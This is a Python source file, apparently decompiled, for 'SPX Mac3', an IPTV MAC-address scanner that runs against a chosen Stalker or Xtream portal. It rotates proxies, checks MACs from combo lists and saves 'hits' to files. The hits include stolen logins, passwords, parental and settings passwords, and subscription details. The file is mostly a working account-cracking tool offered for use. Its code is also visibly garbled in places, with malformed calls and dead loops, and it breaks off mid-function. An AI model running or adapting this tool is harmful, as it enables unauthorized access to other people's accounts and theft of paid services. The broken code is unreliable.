import sys
import os
NOME = 'SPXMac3'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'''\33]2;{NOME}%07''')
import os
import pip

try:
    import requests
except:
    print('requests modulo errors\n')
    pip.main([
        'install',
        'requests'])
    import requests

import random
import time
import datetime
import subprocess
import json
import sys
import re
import base64
import pathlib
import threading
import os
import urllib.request as urllib
import os
import pip
import datetime
import os
import socket
import hashlib
import json
import random
import sys
import time
import re
import marshal
import subprocess
import base64
import pathlib
import threading
import codecs
import logging
from colorama import Fore, Back, Style
if not os.path.exists('/sdcard/SPX/'):
    os.mkdir('/sdcard/SPX/')
if not os.path.exists('/sdcard/SPX/Hits/'):
    os.mkdir('/sdcard/SPX/Hits/')
if not os.path.exists('/sdcard/SPX/Combo/'):
    os.mkdir('/sdcard/SPX/Combo/')
if not os.path.exists('/sdcard/SPX/Proxy/'):
    os.mkdir('/sdcard/SPX/Proxy/')
if not os.path.exists('/sdcard/SPX/Sound/'):
    os.mkdir('/sdcard/SPX/Sound/')
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM:DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES'
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
import requests
import json
import unicodedata
import os
import sys
import re
from urllib.parse import urlsplit
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMPLEMENTOFDEFAULT'
m3uinfo = ''
kate = ''
envivo = 0
peliculas = 0
series = 0
juanka = ''
time_ = time.localtime()
date_ = time.strftime('%d.%m.%Y %H:%M')
start_time = time.strftime('%H:%M', time_)
start_time = start_time.replace(' ', '')
hit_time = time.strftime('%H:%M:%S', time_)
scan_time = time.strftime('%H:%M:%S', time_)
current_time = time.strftime('%d %m %Y - %H:%M:%S', time_)
hora_ini = time.strftime('%d %m %Y/%H:%M:%S', time_)

try:
    import cfscrape
    sesq = requests.Session()
    ses = cfscrape.create_scraper(sesq, **('sess',))
except:
    ses = requests.Session()


try:
    import androidhelper as sl4a
    ad = sl4a.Android()
except:
    pass

os.system('')

try:
    import colorama
except:
    print('colorama module not found \n installing colorama module  now... \n')
    pip.main([
        'install',
        'colorama'])

import colorama
from colorama import Fore

try:
    import flag
except:
    pip.main([
        'install',
        'emoji-country-flag'])
    import flag

pattern = '(^\\S{2,}:\\S{2,}$)|(^.*?(\n|$))'
say = 0
hit = 0
bul = 0
cpm = 1
ckgroup = ''
import os
from time import sleep
os.system('clear')
ckiptv = '\n\33[36m     █▀ █▀█ ▀▄▀ █▀▄▀█ ▄▀█ █▀▀       \33[0m\n\33[36m     ▄█ █▀▀ █░█ █░▀░█ █▀█ █▄▄           \33[0m\n\n\33[32m 👑 🅂🄿🅇 √ 3 🄿🅁🄴🄼🄸🅄🄼 🅂🄲🄰🄽🄽🄴🅁 👑            \33[0m \33[36m \n  ┏━━━━━⬘━━━━━━━━━❖━━━━⬘\n  ┃  [⚔️]DEVLOPER  [🛡️]CKGROUP         \n  ┃  [⚔️]TOOLNAME  [🛡️]SPX MAC+    \n  ┃  [⚔️]REL DATE  [🛡️]9/1/23         \n  ┃  [⚔️]CATEGORY  [🛡️]IPTV           \n  ┗━━━━━⬘━━━━━━━━❖━━━━━⬘\n\33[0m'
print(ckgroup)
cpm = 0
cpmx = 0
hitr = 0
m3uon = 0
m3uvpn = 0
macon = 0
macvpn = 0

def echok(mac, bot, total, hitc, status_code, oran):
    global bib, cpm, cpm, cpm, color, color, color, color, color, color, color, color, color, color, color
    bib = 0
    cpmx = time.time() - cpm
    cpmx = round(60 / cpmx)
    if str(cpmx) == '0':
        cpm = cpm
    else:
        cpm = cpmx
    time_ = time.localtime()
    timex = time.time()
    colors = [
        90,
        91,
        92,
        93,
        94,
        95,
        96,
        97]
    color_code = colors[int(time.time()) % len(colors)]
    text = ' SPX      '
    echo = '\n\n\n\n\n\n\n\n\n\n\n\n\33[33m \n\33[36m     █▀ █▀█ ▀▄▀ █▀▄▀█ ▄▀█ █▀▀       \33[0m\n\33[36m     ▄█ █▀▀ █░█ █░▀░█ █▀█ █▄▄           \33[0m\n\n\33[32m 👑 🅂🄿🅇 √ 3 🄿🅁🄴🄼🄸🅄🄼 🅂🄲🄰🄽🄽🄴🅁 👑            \33[0m \33[36m \n\n\n\33[1;97;44m      卐 🚩CHECKER INFORMATION  🚩 卐    \33[0m \n[🕑] ꜱᴛᴀʀᴛ ᴛɪᴍᴇ ☛ \33[96m ' + hora_ini + '\33[0m\n[🌐] ᴘᴏʀᴛᴀʟ ☛ \33[96m ' + str(panel) + '\33[0m\n[🤖] ʙᴏᴛ ☛ \33[96m ' + str(bot) + '\33[0m\n[🔴] ᴍᴀᴄ ☛    ' + tokenr + str(mac) + ' \33[0m \n[✅] NoVᴘɴ ☛  \33[96m' + str(macon) + '\33[0m      [🔰] ᴠᴘɴ ☛  \33[96m' + str(macvpn) + '\33[0m\n[✅] ᴍ3ᴜ ᴏɴ ☛  \33[96m ' + str(m3uon) + '\33[0m     [❎] ᴠᴘɴ ☛  \33[96m ' + str(m3uvpn) + '\33[0m\n[🔰] ᴛᴏᴛᴀʟ ☛ \33[96m ' + str(combouz) + '\33[0m   [☠️] ᴄᴋᴇᴄᴋᴇᴅ ☛  \33[96m ' + str(total) + '  \33[0m\n[🎯] ᴄᴘᴍ ☛   \33[96m ' + str(cpm) + '\33[0m       \n[🤖] ʀᴜɴ ☛   \33[96m ' + str(oran) + '%\33[0m\n[👑] ʜɪᴛꜱ ☛  ' + str(hitr) + ' ' + str(hitc) + '\n\n\n\33[1;97;44m      卐 🚩ADDITIONAL INFORMATION  🚩 卐   \33[0m\n[👨] ʜᴇʟʟᴏ ☛  \33[96m' + nickn + '  \33[0m\n[🕠] ᴛɪᴍᴇ ɴᴏᴡ ☛  \33[96m' + str(time.strftime('%H:%M:%S')) + '\33[0m\n[🎯] ᴘʀᴏᴛᴏᴄᴀʟ ☛  \33[0m\33[36m HTTP \33[0m | \33[0m' + color + str(status_code) + '\33[0m\n[📂] ᴄᴏᴍʙᴏ ☛  \33[96m ' + combodosya + '\33[0m\n[👺] ᴄʜᴇᴄᴋᴇʀ ☛  \33[96m ꜱᴘx ᴀᴜᴛᴏ ᴄʜᴇᴄᴋᴇʀ\33[0m\n\n\n\33[1;97;100m卐  卐  卐  卐  卐  CK GROUP  卐  卐  卐   卐  卐 \33[0m\n\n\n\n\n\n\n\n\n\n\n\n                                            '
    print(echo)
    time.sleep(0.5)
    cpm = time.time()
    if status_code == 200:
        color = '\33[1m\33[32m'
    if status_code == 301:
        color = '\33[1m\33[1;31m'
    if status_code == 302:
        color = '\33[1m\33[1;31m'
    if status_code == 403:
        color = '\33[1m\33[1;31m'
    if status_code == 404:
        color = '\33[1m\33[38;5;202m'
    if status_code == 407:
        color = '\33[1m\33[38;5;003m'
    if status_code == 429:
        color = '\33[1m\33[1m\33[93m'
    if status_code == 500:
        color = '\33[1m\33[38;5;202m'
    if status_code == 503:
        color = '\33[1m\33[38;5;226m'
    if status_code == 512:
        color = '\33[1m\33[38;5;134m'
    if status_code == 520:
        color = '\33[1m\33[35m'

bot = 0
hit = 0
hitr = '\33[1;92m'
tokenr = '\33[0m'
oran = ''

def bekle(bib, vr):
    i = bib
    animation = [
        '[●○○○○○○○○○○○○○○]',
        '[●●○○○○○○○○○○○○○]',
        '[●●●○○○○○○○○○○○○]',
        '[●●●●○○○○○○○○○○○]',
        '[●●●●●○○○○○○○○○○]',
        '[●●●●●●○○○○○○○○○]',
        '[●●●●●●●○○○○○○○○]',
        '[●●●●●●●●○○○○○○○]',
        '[●●●●●●●●●○○○○○○]',
        '[●●●●●●●●●●○○○○○]',
        '[●●●●●●●●●●●○○○○]',
        '[●●●●●●●●●●●●○○○]',
        '[●●●●●●●●●●●●●○○]',
        '[●●●●●●●●●●●●●●○]',
        '[●●●●●●●●●●●●●●●]']
    time.sleep(0.2)
    sys.stdout.write('\r\33[38;5;186mPROXY  \33[38;5;051m' + animation[i % len(animation)] + '          \33[38;5;186m Check.. \33[0m')
    sys.stdout.flush()

kanalkata = '2'
stalker_portal = 'ckgroup'

def hityaz(mac, trh, real, m3ulink, m3uimage, durum, vpn, livelist, vodlist, serieslist, playerapi, fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online, parent_password, stb_type, comment, country, settings_password, kanalsayisi, filmsayisi, dizisayisi, ip, sip, servreg, sname, country_name, scountry, yport, yanpan, m3uinfo):
    global hitsay, hitr
    panell = panel
    reall = real
    if 'ckgroup' == 'ckgroup':
        simza = ''
        sifre1 = ''
        simza5 = ''
        imza1 = ''
        if m3uimage == 'ᴀᴄᴛɪᴠᴇ😝':
            m3uinfo = '\n┣❖m3u\\on⇥ ' + m3uimage + '\n┣❖m3u Link⇥ ' + m3ulink + '\n┇'
        if uzmanm == 'stalker_portal/server/load.php':
            panell = str(panel) + '/stalker_portal'
            reall = real.replace('/c/', '/stalker_portal/c/')
            simza = '\n\n┏❖𝗦𝗣𝗫 𝗩𝟯 𝗦𝗖𝗔𝗡𝗡𝗘𝗥❖\n┣━━━━━━━━━━━━━❖\t\t\n┣❖BillingDate⇥ ' + str(bill) + '\n┣❖ExpireDate⇥ ' + expire_billing_date + '\t \n┣❖Login⇥ ' + login + '\n┣❖Username⇥ ' + fname + '\n┣❖Password⇥ ' + password + '\n┣❖ParrentPassword⇥ ' + parent_password + '\n┣❖Plan ID⇥ ' + tariff_plan_id + '\n┣━━━━━━━━━━━━━❖\n┣❖Plan⇥ ' + tariff_plan + '\n┣❖Max Online⇥ ' + max_online + '\n┣❖StbType⇥ ' + stb_type + '\n┣❖Country⇥ ' + country + '\n┣❖Setting Password⇥ ' + settings_password + '\n┣❖Hits By⇥ ' + str(nickn) + ' \n┣━━━━━━━━━━━━━❖\n┗❖ @CKIPTV @CKIPTV2 ⚇'
        imza = '\n\n┏❖𝗦𝗣𝗫 𝗩𝟯 𝗦𝗖𝗔𝗡𝗡𝗘𝗥❖\n┣━━━━━━━━━━━━❖\n┣❖ʀᴇᴀʟ⇥ ' + str(reall) + '\n┣❖ᴘᴀɴᴇʟ⇥ http://' + str(panell) + '/c/\n┣❖ᴍᴀᴄ⇥ ' + str(mac) + '\n┣❖ᴇxᴘ⇥ ' + str(trh) + '\n┣❖ꜱᴇʀᴠᴇʀ ᴀᴛᴛᴀᴄᴋ⇥ ' + str(attack) + '\n┣━━━━━━━━━━━━━❖\n┣❖ꜱᴘx ᴘʏ⇥ https://bit.ly/spxpkg\n┣❖ᴄᴏɴᴛᴀᴄᴛ⇥ @ckiptv ⇥ @ckiptv2\n┣━━━━━━━━━━━━━❖\n┣❖ᴛʏᴘᴇ⇥ ' + str(uzmanm) + '\n┣❖ᴍᴀᴄ ꜱᴛᴀᴛᴜꜱ⇥  ' + str(durum) + '\n┣❖ᴍ3ᴜ ꜱᴛᴀᴛᴜꜱ⇥ ' + m3uimage + '\n┣❖ᴠᴘɴ⇥ ' + str(vpn) + '\n┣━━━━━━━━━━━━━❖\n┗❖ ʜɪᴛꜱ ʙʏ⇥ ' + str(nickn) + ' \n\t\t    \n┏❖ꜱᴇʀᴠᴇʀ ɪɴꜰᴏ❖\n┣━━━━━━━━━━━━━❖\n┣❖ᴄᴏᴜɴᴛʀʏ⇥ ' + str(country_name) + ' ⇥ ' + data_server(str(scountry)) + '\n┣❖ɪᴘ⇥ ' + str(sip) + ' \n┣❖ɴᴀᴍᴇ⇥ ' + str(sname) + '\n┣❖ʀᴇɢɪꜱᴛʀʏ⇥ ' + str(servreg) + '\n┣❖ᴄʟɪᴇɴᴛ ɪᴘ⇥ ' + str(vpn) + '\n┣━━━━━━━━━━━━━❖\t\n┣❖ ꜱᴜʙᴘᴏʀᴛᴀʟꜱ\n┣❖' + str(yanpan) + ':' + str(yport) + '\n┗❖ꜱᴘx ᴠ3 ᴘʏ ᴄᴏɴꜰɪɢ❖'
        ximza = '\n' + str(playerapi) + '     '
        sifre = device(mac)
        sifre1 = device1(mac)
        pimza = ' '
        imza = imza + simza + ximza + pimza + sifre
        if len(kanalsayisi) > 1:
            imza = imza + '\n┏❖ ᴘᴏʀᴛᴀʟ ᴄᴏɴᴛᴀɪɴꜱ ❖\n┣━━━━━━━━━━━━━⬘\n┣❖Cʜᴀɴɴᴇʟ⇥ ' + kanalsayisi + '\n┣❖Vᴏᴅ⇥ ' + filmsayisi + '\n┣❖Sᴇʀɪᴇꜱ⇥ ' + dizisayisi + ' \n┗❖ ꜱᴘx ᴠ3 ᴘʏ ᴄᴏɴꜰɪɢ ❖'
        if kanalkata == '1' or kanalkata == '2':
            imza = imza + ' \n\n┏❖ ʟɪᴠᴇ ʟɪꜱᴛ ❖\n┗❖ ' + str(livelist) + '  '
        if kanalkata == '2':
            imza = imza + '  \n\n┏❖ ᴠᴏᴅ ʟɪꜱᴛ ❖\n┗❖ ' + str(vodlist) + ' \n\n┏❖ꜱᴇʀɪᴇꜱ ʟɪꜱᴛ ❖\n┗❖ ' + str(serieslist) + ' \n'
            imza2 = '\n' + str(mac) + ''
            imza1 = ' \t\t\t\n┏❖❖𝗦𝗣𝗫 𝗩𝟯 𝗦𝗖𝗔𝗡𝗡𝗘𝗥❖❖\n┣❖Tʏᴘᴇ⇥ ' + str(uzmanm) + '➚⁽ˢᵀᴮ⁵⁾\n┣❖Pᴀɴᴇʟ⇥ ' + http + '://' + str(panell) + '/c/\n┣❖Mᴀᴄ⇥ ' + str(mac) + '\n┣❖Exᴘ⇥ ' + str(trh) + ' '
            imza3 = '\n┣❖Mᴀᴄ\\on⇥ ' + str(durum) + ' ' + str(m3uinfo) + '\n┣━━━━━━━━━━━━━❖\n┣❖ꜱᴘx ᴘʏ⇥ https://bit.ly/spxpkg\n┣❖ᴄᴏɴᴛᴀᴄᴛ⇥ @ckiptv ⇥ @ckiptv2\n┣━━━━━━━━━━━━━❖\n┣❖ꜱᴇʀᴠᴇʀ ɪɴꜰᴏ❖\n┣❖ᴄᴏᴜɴᴛʀʏ⇥ ' + str(country_name) + ' ⇥ ' + data_server(str(scountry)) + '\n┣❖ɪᴘ⇥ ' + str(sip) + ' \n┣❖ɴᴀᴍᴇ⇥ ' + str(sname) + '\n┣❖ʀᴇɢɪꜱᴛʀʏ⇥ ' + str(servreg) + '\n┣❖ᴄʟɪᴇɴᴛ ɪᴘ⇥ ' + str(vpn) + '\n┗❖❖ꜱᴘx ᴠ3 ᴘʏ ᴄᴏɴꜰɪɢ❖❖\n┏❖ʜɪᴛꜱ ʙʏ⇥' + nickn + '\n┗❖ᴛɪᴍᴇ⇥' + str(time.strftime('%H:%M:%S')) + ' / ' + str(time.strftime('%d-%m-%Y')) + ' \n\n '
            imza4 = '\n❖ ' + str(mac) + ' ❖ ' + str(trh) + ' '
            imza1 = imza1 + sifre1 + imza3
        yaz(imza1)
        yam(imza2)
        yax(imza)
        yav(imza4)
        hitsay = hitsay + 1
        print(imza1)
        if hitsay >= hit:
            hitr = '\33[1;92m'


def data_server(scountry):
    bandera = ''
    pais = ''
    origen = ''
    
    try:
        codpais = scountry
        bandera = flag.flag(codpais)
        origen = bandera
    except:
        pass

    return origen

os.system('clear')
subprocess.run([
    'clear',
    ''])
print(ckiptv)
nickn = str(input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mENTER YOUR NICKNAME...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mNICK:\33[0m\33[1;90m '))
if nickn == '':
    nickn = 'CKIPTV'
os.system('clear')
subprocess.run([
    'clear',
    ''])
print(ckiptv)
panel = str(input('\33[1;91m[ \33[0m+\33[1;91m ]\33[0m\33[1;33mENTER YOUR PANNEL:PORT...\n\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31mPANNEL:PORT:\33[0m\33[1;90m '))
hitsf = '/sdcard/SPX/Hits/Full/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
hitsf = '/sdcard/SPX/Hits/Semi/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
hitsf = '/sdcard/SPX/Hits/MacExp/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
hitsf = '/sdcard/SPX/Hits/Mac/'
if not os.path.exists(hitsf):
    os.mkdir(hitsf)
hitsay = 0
say = 1

def yax(hits):
    dosya = open('/sdcard/SPX/Hits/Full/ꜱᴘxᴠ3_' + nickn + '_' + panel.replace(':', '_').replace('/', '') + '@ᴄᴋɪᴘᴛᴠ.txt', 'a+')
    dosya.write(hits)
    dosya.close()


def yaz(hits):
    dosya = open('/sdcard/SPX/Hits/Semi/ꜱᴘxᴠ3_' + nickn + '_' + panel.replace(':', '_').replace('/', '') + '@ᴄᴋɪᴘᴛᴠ.txt', 'a+')
    dosya.write(hits)
    dosya.close()


def yav(hits):
    archivo = open('/sdcard/SPX/Hits/MacExp/ꜱᴘxᴠ3_' + nickn + '_' + panel.replace(':', '_').replace('/', '') + '@ᴄᴋɪᴘᴛᴠ.txt', 'a+')
    archivo.write(hits)
    archivo.close()


def yam(hits):
    dosya = open('/sdcard/SPX/Hits/Mac/ꜱᴘxᴠ3_' + nickn + '_' + panel.replace(':', '_').replace('/', '') + '@ᴄᴋɪᴘᴛᴠ.txt', 'a+')
    dosya.write(hits)
    dosya.close()


def device(mac):
    mac = mac.upper()
    SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
    SNENC = SN.upper()
    SNCUT = SNENC[:13]
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC = DEV.upper()
    DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
    DEVENC1 = DEV1.upper()
    SG = SNCUT + '+' + mac
    SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
    SINGENC = SING.upper()
    sifre = '\n┏❖ᴀᴅᴅɪᴛɪᴏɴᴀʟ ɪɴꜰᴏ\n┣❖Sɴ⇥' + SNENC + '   \n┣❖SɴCᴜᴛ⇥' + SNCUT + '\n┣❖Iᴅ1⇥' + DEVENC + '\n┣❖Iᴅ2⇥' + SINGENC + '\n┗❖ꜱᴘx ᴠ3 ᴘʏ ᴄᴏɴꜰɪɢ❖'
    return sifre


def device1(mac):
    mac = mac.upper()
    SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
    SNENC = SN.upper()
    SNCUT = SNENC[:13]
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC = DEV.upper()
    DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
    DEVENC1 = DEV1.upper()
    SG = SNCUT + '+' + mac
    SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
    SINGENC = SING.upper()
    sifre1 = '\n┣❖SɴCᴜᴛ⇥' + SNCUT + '\n┣❖Iᴅ1⇥' + DEVENC + '\n┣❖Iᴅ2⇥' + SINGENC + ''
    return sifre1


def list(listlink, mac, token, livel):
    kategori = ''
    country_record = ' Afghanistan | Albania | Algeria | Andorra | Angola | Antigua and Barbuda | Argentina | Armenia | Australia | Austria | Azerbaijan | Bahamas | Bahrain | Bangladesh | Barbados | Belarus | Belgium | Belize | Benin | Bhutan | Bolivia | Bosnia and Herzegovina | Botswana | Brazil | Brunei | Bulgaria | Burkina Faso | Burundi | Cabo Verde | Cambodia | Cameroon | Canada | Central African Republic | Chad | Chile | China | Colombia | Comoros | Congo | Costa Rica | Côte d’Ivoire | Croatia | Cuba | Cyprus | Czech Republic | Denmark | Djibouti | Dominica | Dominican Republic | East Timor | Ecuador | Egypt | El Salvador | Equatorial Guinea | Eritrea | Estonia | Eswatini | Ethiopia | Fiji | Finland | France | Gabon | Gambia | Georgia | Germany | Ghana | Greece | Grenada | Guatemala | Guinea | Guinea-Bissau | Guyana | Haiti | Honduras | Hungary | Iceland | India | Indonesia | Iran | Iraq | Ireland | Israel | Italy | Jamaica | Japan | Jordan | Kazakhstan | Kenya | Kiribati | North Korea | South Korea | Kosovo | Kuwait | Kyrgyzstan | Laos | Latvia | Lebanon | Lesotho | Liberia | Libya | Liechtenstein | Lithuania | Luxembourg | Madagascar | Malawi | Malaysia | Maldives | Mali | Malta | Marshall Islands | Mauritania | Mauritius | Mexico | Federated States of Micronesia | Moldova | Monaco | Mongolia | Montenegro | Morocco | Mozambique | Burma | Myanmar | Namibia | Nauru | Nepal | Netherlands | New Zealand | Nicaragua | Niger | Nigeria | North Macedonia | Norway | Oman | Pakistan | Palau | Panama | Papua New Guinea | Paraguay | Peru | Philippines | Poland | Portugal | Qatar | Romania | Russia | Rwanda | Saint Kitts and Nevis | Saint Lucia | Saint Vincent and the Grenadines | Samoa | San Marino | Sao Tome and Principe | Saudi Arabia | Senegal | Serbia | Seychelles | Sierra Leone | Singapore | Slovakia | Slovenia | Solomon Islands | Somalia | South Africa | Spain | Sri Lanka | Sudan | South Sudan | Suriname | Sweden | Switzerland | Syria | Taiwan | Tajikistan | Tanzania | Thailand | Togo | Tonga | Trinidad and Tobago | Tunisia | Turkey | Turkmenistan | Tuvalu | Uganda | Ukraine | United Arab Emirates | United Kingdom | United States | Uruguay | Uzbekistan | Vanuatu | Vatican City | Venezuela | Vietnam | Yemen | Zambia | Zimbabwe | Abkhazian | Afar | Afrikaans | Akan | Albanian | Amharic | Arabic | Aragonese | Armenian | Assamese | Avaric | Avestan | Aymara | Azerbaijani | Bambara | Bashkir | Basque | Belarusian | Bengali | Bislama | Bosnian | Breton | Bulgarian | Burmese | Canadien | Catalan | Chamorro | Chechen | Chichewa | Chinese | Slavonic | Chuvash | Cornish | Corsican | Cree | Croatian | Czech | Danish | Divehi | Dhivehi | Maldivian | Dutch | Dzongkha | English | Esperanto | Estonian | Ewe | Faroese | Fijian | Finnish | French | Western Frisian | Fulah | Gaelic | Galician | Ganda | Georgian | German | Greek | KalaallisutGreenlandic | Guarani | Gujarati | Haitian | Hausa | Hebrew | Herero | Hindi | Hiri Motu | Hungarian | Icelandic | Ido | Igbo | Indonesian | Interlingua | Interlingue | Inuktitut | Inupiaq | Irish | Italian | Japanese | Javanese | Kannada | Kanuri | Kashmiri | Kazakh | Khmer | Cambodian | Kikuyu | Gikuyu | Kinyarwanda | Kirghiz | Kyrgyz | Komi | Kongo | Korean | Kuanyama | Kwanyama | Kurdish | Lao | Latin | Latvian | Limburgan | Limburger | Limburgish | Lingala | Lithuanian | Luba-Katanga | Luxembourgish | Letzeburgesch | Macedonian | Malagasy | Malay | Malayalam | Maltese | Manx | Maori | Māori | Marathi | Marāṭhī | Marshallese | Mongolian | Nauru | Nauruan | Navajo | Navaho | North Ndebele | Northern Ndebele | South Ndebele | Southern Ndebele | Ndonga | Nepali | Norwegian | Sichuan Yi | Nuosu | Occitan | Ojibwa | Oriya | Oromo | Ossetian | Ossetic | Pali | Pashto | Pushto | Persian | Farsi | Polish | Portuguese | Punjabi | Panjabi | Quechua | Romanian | Moldavian | Moldovan | Romansh | Rundi | Russian | Northern Sami | Samoan | Sango | Sanskrit | Sardinian | Serbian | Shona | Sindhi | Sinhala | Sinhalese | Slovak | Slovenian | Somali | Southern Sotho | Spanish | Castilian | Sundanese | Swahili | Swati | Swedish | Tagalog | Filipino | Tahitian | Tajik | Tamil | Tatar | Telugu | Thai | Tibetan | Tigrinya | Tonga | Tongan | Tsonga | Tswana | Turkish | Turkmen | Twi | Uighur | Uyghur | Ukrainian | Urdu | Uzbek | Venda | Vietnamese | Volapük | Walloon | Welsh | Wolof | Xhosa | Yiddish | Yoruba | Zhuang | Chuang | Zulu | canada | usa | uk | germany | vietnam | africa | india | latino | colombia | argentina | portugal | brazil | chile | peru | australia | italy | greek | caribbean | philippines | france | us/ca | tajikistan | uzbekistan | venezuela | spain | salvador | guatemala | honduras | panama | haiti | mexico | latvia | armenia | estonia | belarus | brasil | Algeria | malta | puerto rico | afghanistan | bulgaria | lithunia | ukraine | russia | indonesia | sri lanka | hongkong | south korea | Afghan | Sudan | Libya | china | malesyia | malaysia | kurdish | taiwan | azerbejian | Kannada | Persian | azerbaijan | arabic | pakistan | georgia | kazachstan | Kazakhstan | australia | Bangla/Bengali | Urdu | Palestine | Telugu | Malayalam | Marathi | Oriya | Gujarat | Somali | thailand | iran | iraq | Sinhala | Hindi | Tamil | israel | Punjabi | switzerland | turkey | Egypt | finland | denmark | sweden | norway | hungary | czech republic | belgium | grecce | romania | netherland | spain | poland | albania | ireland | latin | netherlands | czech | belize | dominican | Lebanon | Gulf | Nepali | argentina | congo | Saudia Arabia | cameroon | kenya | ethiopia | jordan | kuwait | uae | Slovenia | cambodia | Syria | indonesia | bahrain | austria | canadian | filipino | Tunisia | Morocco | english | African | Australian | Brazilian | Danish | Dutch/Belgian | French | German | Indian | Italian | Nordic | Polish | Portuguese | Romanian | Spanish | Swedish | Canadian | Irish | turkish | chinese | Ukrainian | costa rica | dominicana | uruguay | paraguay | nicaragua | ecuador | cuba | united kingdom | united states | espanha | italia | swiss | scandinavia | balkan | can | eng | portugal/brazil | macedonia | espania | turkiye | rep dominicana | espana | deutchland | letzebuerg | Nederland | turquia | românia | ca | us | de | vn | za | co | ar | pt | br | cl | pe | au | it | gr | ph | fr | tj | uz | ve | es | sv | gt | hn | pa | ht | mx | lv | id | am | ee | by | mt | pr | af | bg | lt | ua | ru | id | lk | hk | kr | cn | my | tw | az | pk | ge | kz | au | th | ir | iq | il | ch | tr | fi | dk | se | no | hu | be | gr | ro | cd | cm | ke | et | jo | kw | kh | id | bh | at | ca | uy | py | ni | ec | cu | us | mk |dz | sd | ly | tn '
    veri = ''
    while None:
        
        try:
            res = ses.get(chlistlink, hea2(mac, token), proxygetir(), 15, False, **('headers', 'proxies', 'timeout', 'verify'))
            veri = str(res.text)
        except:
            pass
        continue
    if veri.count('title":"') > 0:
        for i in veri.split('title":"'):
            
            try:
                kanal = ''
                kanal = str(i.split('"')[0].encode('utf-8').decode('unicode-escape')).replace('\\/', '/')
            except:
                pass

            kategori = kategori + kanal + livel
        
    list = kategori
    return list


def m3ugoruntu(cid, user, pas, plink):
    durum = 'ᴏꜰꜰʟɪɴᴇ😔'
    
    try:
        url = http + '://' + plink + '/live/' + str(user) + '/' + str(pas) + '/' + str(cid) + '.ts'
        res = ses.get(url, hea3(), (2, 5), False, True, **('headers', 'timeout', 'allow_redirects', 'stream'))
        if res.status_code == 302 or res.status_code == 406:
            durum = 'ᴀᴄᴛɪᴠᴇ😝'
    except:
        durum = 'ᴏꜰꜰʟɪɴᴇ😔'

    return durum

hit = 0

def m3uapi(playerlink, mac, token):
    mt = ''
    bag = 0
    veri = ''
    bad = 0
    while True:
        
        try:
            res = ses.get(playerlink, hea2(mac, token), proxygetir(), 3, False, **('headers', 'proxies', 'timeout', 'verify'))
            veri = str(res.text)
        except:
            continue
            if not proxi == '1':
                bad = bad + 1
                if bad == 3:
                    break
    if veri == '' or '404' in veri:
        bad = 0
        while True:
            
            try:
                playerlink = playerlink.replace('player_api.php', 'panel_api.php')
                res = ses.get(playerlink, hea2(mac, token), proxygetir(), 3, False, **('headers', 'proxies', 'timeout', 'verify'))
                veri = str(res.text)
            except:
                continue
                if not proxi == '1':
                    bad = bad + 1
                    if bad == 3:
                        break
 
    acon = ''
    timezone = ''
    message = ''
    if 'active_cons' in veri:
        acon = veri.split('active_cons":')[1]
        acon = acon.split(',')[0]
        acon = acon.replace('"', '')
        mcon = veri.split('max_connections":')[1]
        mcon = mcon.split(',')[0]
        mcon = mcon.replace('"', '')
        status = veri.split('status":')[1]
        status = status.split(',')[0]
        status = status.replace('"', '')
        
        try:
            timezone = veri.split('timezone":"')[1]
            timezone = timezone.split('",')[0]
            timezone = timezone.split('"}')[0]
            timezone = timezone.replace('\\/', '/')
            timezone = timezone.replace('UTC', 'Universal Time Coordinated 🌍')
            timezone = timezone.replace('Europe/Andorra', 'Europe Andorra 🇦🇩')
            timezone = timezone.replace('Asia/Dubai', 'Asia Dubai United Arab Emirates 🇦🇪')
